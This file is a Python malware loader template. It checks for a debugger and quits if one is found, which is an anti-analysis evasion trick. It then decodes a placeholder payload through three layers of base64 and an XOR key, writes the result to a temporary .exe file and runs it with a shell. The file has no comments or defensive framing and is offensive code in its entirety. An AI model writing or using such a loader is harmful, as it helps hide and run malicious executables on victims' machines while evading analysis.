import base64
import tempfile
import subprocess
import os
import sys


def is_debugger_present():
    try:
        import ctypes
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        return False

if is_debugger_present() or sys.gettrace():
    print("Debugger detected. Exiting.")
    sys.exit()


def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def multi_layer_base64_decode(data, layers=3):
    for _ in range(layers):
        data = base64.b64decode(data)
    return data


encoded_payload = b"#<BASE64>"
key_bytes = b"#<KEY>"
decrypted_data = xor_decrypt(multi_layer_base64_decode(encoded_payload), key_bytes)


with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as temp_file:
    temp_file.write(decrypted_data)
    temp_file.flush()
    subprocess.Popen(temp_file.name, shell=True)


